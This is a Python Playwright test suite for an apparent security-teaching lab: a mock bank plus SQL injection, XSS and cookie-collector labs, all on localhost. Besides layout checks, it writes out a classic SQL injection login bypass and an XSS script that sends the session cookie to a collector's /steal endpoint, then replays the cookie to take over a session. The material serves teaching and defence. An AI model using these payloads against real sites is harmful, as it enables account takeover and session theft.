import os,re,json,threading
from pathlib import Path
from urllib.parse import urlsplit
from playwright.sync_api import sync_playwright
from werkzeug.serving import make_server
from werkzeug.security import generate_password_hash
from bank import create_app
from bank.db import connect
from attacks import lab
import attacker,teacher_password

def test_all_page_layouts(tmp_path,monkeypatch):
    bank_path=tmp_path/'bank.sqlite'
    monkeypatch.setenv('ATTACKS_DATABASE',str(tmp_path/'attacks.sqlite'))
    monkeypatch.setenv('ATTACKS_SECRET_KEY','a'*40)
    monkeypatch.setenv('ATTACKS_LAB_ACCESS_CODE','')
    monkeypatch.setattr(teacher_password,'bank_database',lambda:bank_path)
    bank=create_app({'SECRET_KEY':'b'*40,'DATABASE':str(bank_path),'LAB_ACCESS_CODE':'classcode','TRUSTED_HOSTS':['127.0.0.1'],'SESSION_COOKIE_SECURE':False,'SESSION_COOKIE_SAMESITE':'Lax'})
    origins={name:f'http://127.0.0.1:{port}' for name,port in [('bank',5250),('playground',5251),('sql',5252),('xss',5253),('collector',5254)]}
    with bank.app_context(),connect() as db:
        uid=db.execute('INSERT INTO users(username,password_hash,is_admin) VALUES (?,?,1)',('pony',generate_password_hash('ponypony'))).lastrowid
        db.execute('INSERT INTO accounts(user_id,number,balance) VALUES (?,?,500000)',(uid,'DBAUDIT001'))
        db.execute("INSERT INTO metadata VALUES ('public_endpoints',?)",(json.dumps({'bank':origins['bank'],'playground':origins['playground']+'/playground','cross_site':False}),))
    apps={'bank':bank,'playground':attacker.app,**{name:lab.create_app(name) for name in ['sql','xss','collector']}}
    with lab.db() as db:
        db.execute('INSERT INTO users(username,password_hash,is_admin) VALUES (?,?,1)',('pony',generate_password_hash('ponypony')))
        db.execute("INSERT INTO settings VALUES ('urls',?)",(json.dumps({k:origins[k] for k in ['sql','xss','collector']}),))
    monkeypatch.setitem(attacker.app.config,'ENDPOINT_PROVIDER',lambda:origins['bank'])
    servers=[make_server('127.0.0.1',urlsplit(origins[name]).port,app,threaded=True) for name,app in apps.items()]
    for server in servers:threading.Thread(target=server.serve_forever,daemon=True).start()
    try:
        with sync_playwright() as p:
            browser=p.chromium.launch(channel=os.getenv('BROWSER_CHANNEL') or None)
            ctx=browser.new_context()
            access=ctx.request.get(origins['bank']+'/access').text()
            access_token=re.search('name="csrf_token"[^>]*value="([^"]+)"',access)[1]
            ctx.request.post(origins['bank']+'/access',form={'csrf_token':access_token,'code':'classcode'})
            html=ctx.request.get(origins['bank']+'/login').text()
            token=re.search('name="csrf_token"[^>]*value="([^"]+)"',html)[1]
            assert ctx.request.post(origins['bank']+'/login',form={'username':'pony','password':'ponypony','csrf_token':token}).ok
            for name in ['sql','xss','collector']:
                assert ctx.request.get(origins['bank']+'/labs/enter/'+name).ok
            paths={'bank':['/labs','/login','/register','/access','/bank','/lab','/admin/','/admin/password'],
                   'playground':['/playground'],
                   'sql':['/','/simulate/login','/security','/admin','/admin/users/add','/password'],
                   'xss':['/','/security','/admin','/password'],
                   'collector':['/','/security','/admin','/password']}
            member_page=ctx.new_page();guest=browser.new_context();guest_page=guest.new_page();errors=[]
            access=guest.request.get(origins['bank']+'/access').text()
            access_token=re.search('name="csrf_token"[^>]*value="([^"]+)"',access)[1]
            guest.request.post(origins['bank']+'/access',form={'csrf_token':access_token,'code':'classcode'})
            for current in [member_page,guest_page]:
                current.on('pageerror',lambda error:errors.append(str(error)))
                current.on('response',lambda response:errors.append(f'CSS failure {response.url}') if '.css' in response.url and response.status>=400 else None)
            output=Path('test-results/page-audit');output.mkdir(parents=True,exist_ok=True)
            audited=[]
            for kind,routes in paths.items():
                for route in routes:
                    page=guest_page if route in ['/login','/teacher/login','/register'] else member_page
                    page.set_viewport_size({'width':1280,'height':900})
                    response=page.goto(origins[kind]+route)
                    assert response.status==200,(kind,route,response.status)
                    assert page.locator('link[rel=stylesheet]').count()>0
                    page.set_viewport_size({'width':390,'height':844})
                    assert page.evaluate('document.documentElement.scrollWidth <= innerWidth'),(kind,route,'mobile overflow')
                    page.screenshot(path=str(output/(kind+'-'+(route.strip('/').replace('/','-') or 'home')+'.png')),full_page=True)
                    audited.append(kind+route)
            assert not errors,errors
            student=browser.new_context();student_page=student.new_page()
            student_page.goto(origins['bank'])
            student_page.locator('[name=code]').fill('classcode')
            student_page.get_by_role('button',name='進入課程',exact=True).click()
            student_page.goto(origins['bank']+'/register')
            student_page.locator('[name=username]').fill('newstudent')
            student_page.locator('[name=password]').fill('student001')
            student_page.get_by_role('button',name='建立帳戶',exact=True).click()
            student_page.wait_for_url(origins['bank']+'/labs')
            student_page.get_by_role('link',name='進入 SQL Lab',exact=True).click()
            student_page.wait_for_url(origins['sql']+'/')
            assert student_page.get_by_role('link',name='管理中心',exact=True).count()==0
            student_page.get_by_role('link',name='開啟模擬登入',exact=True).click()
            student_page.locator('[name=username]').fill("' OR 1=1 -- ")
            student_page.locator('[name=password]').fill('bad')
            student_page.get_by_role('button',name='執行模擬登入',exact=True).click()
            assert '模擬登入成功' in student_page.content()
            assert student.request.get(origins['sql']+'/admin').status==403
            student_page.get_by_role('link',name='Lab 總覽',exact=True).click()
            student_page.get_by_role('link',name='進入 XSS Lab',exact=True).click()
            student_page.wait_for_url(origins['xss']+'/')
            payload="<script>const c=document.cookie.split('; ').find(x=>x.startsWith('xss_lab_session='));if(c)new Image().src='"+origins['collector']+"/steal?cookie='+encodeURIComponent(c);</script>"
            student_page.locator('[name=content]').fill(payload)
            student_page.get_by_role('button',name='送出留言',exact=True).click()
            with member_page.expect_request(lambda r:'/steal?cookie=' in r.url):
                member_page.goto(origins['xss']+'/')
            stolen=next(c['value'] for c in ctx.cookies(origins['xss']) if c['name']=='xss_lab_session')
            student_page.goto(origins['bank']+'/labs')
            student_page.get_by_role('link',name='進入 Collector',exact=True).click()
            student_page.wait_for_url(origins['collector']+'/')
            assert stolen in student_page.content()
            student.add_cookies([{'name':'xss_lab_session','value':stolen,'url':origins['xss'],'sameSite':'Lax'}])
            student_page.goto(origins['xss']+'/')
            assert '<strong>pony</strong>' in student_page.content()
            assert student.request.get(origins['xss']+'/admin').status==403
            member_page.goto(origins['xss']+'/security')
            member_page.locator('[name=mode]').select_option('protected')
            member_page.get_by_role('button',name='套用',exact=True).click()
            protected=next(c for c in ctx.cookies(origins['xss']) if c['name']=='xss_lab_session')
            assert protected['httpOnly'] and protected['value']!=stolen
            (output/'report.json').write_text(json.dumps(audited,indent=2),encoding='utf-8')
            browser.close()
    finally:
        for server in servers:server.shutdown();server.server_close()
